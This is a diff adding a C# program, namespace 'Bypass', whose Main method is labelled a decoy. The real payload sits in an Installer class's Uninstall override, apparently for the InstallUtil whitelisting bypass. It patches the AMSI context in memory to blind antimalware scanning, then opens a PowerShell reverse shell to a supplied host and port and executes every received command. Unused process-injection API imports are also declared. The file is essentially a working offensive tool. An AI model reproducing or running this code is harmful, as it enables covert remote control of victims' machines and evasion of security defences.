@@ -1,0 +1,107 @@
+using System;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Configuration.Install;
+using System.IO;
+using System.Collections.ObjectModel;
+using System.Text;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+namespace Bypass
+{
+    class Program
+    {
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+        public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetCurrentProcess();
+
+        static void Main(string[] args)
+        {
+            Console.WriteLine("This is the main method which is a decoy");
+
+        }
+    }
+
+    [System.ComponentModel.RunInstaller(true)]
+    public class Sample : System.Configuration.Install.Installer
+    {
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            string basepath = Directory.GetCurrentDirectory();
+            string cmd;
+            string rhost = "", port = "";
+            rhost = this.Context.Parameters["rhost"];
+            port = this.Context.Parameters["rport"];
+
+
+            Runspace rs = RunspaceFactory.CreateRunspace();
+            rs.Open();
+            PowerShell ps = PowerShell.Create();
+            ps.Runspace = rs;
+            //Runspace.DefaultRunspace.SessionStateProxy.LanguageMode = PSLanguageMode.FullLanguage;
+            ps.AddScript(@"$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "" * iUtils"") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "" * Context"") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)");
+            ps.Invoke();
+
+            cmd = @"try{
+                    $tcpClient = New-Object System.Net.Sockets.TcpClient('{RHOST}', {PORT});
+                    $stream = $tcpClient.GetStream();
+                    $reader = New-Object System.IO.StreamReader $stream;
+                    $writer = New-Object System.IO.StreamWriter $stream;
+                    $writer.AutoFlush = $true;
+
+                    $writer.Write('PS ' + (pwd).Path + '> ');    
+                    do {
+                    $line = $reader.ReadLine();
+                    if ($line -and $line -ne ([char]4)) {
+                    #Write-Host ""Received: $line"" -ForegroundColor Cyan;
+                    #$response = ""Processed: $line"";
+                    #$writer.WriteLine($response);
+                    try
+                    {	
+                    $sendback = (iex $line 2>&1 | Out-String );
+                    $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
+                    }
+                    catch
+                    {
+                    $error[0].ToString() + $error[0].InvocationInfo.PositionMessage;
+                    $sendback2  =  ""ERROR: "" + $error[0].ToString() + ""`n`n"" + ""PS "" + (pwd).Path + '>';
+                    }
+                    $writer.Write($sendback2);
+                    }
+                    } while ($line -ne ""exit"")
+                    $writer.WriteLine(""exiting"");
+                    $tcpClient.close();
+                    }catch{}";
+
+
+            cmd = cmd.Replace("{RHOST}", rhost).Replace("{PORT}", port);
+            ps.AddScript(cmd);
+            ps.Invoke();
+
+
+            rs.Close();
+        }
+    }
+}
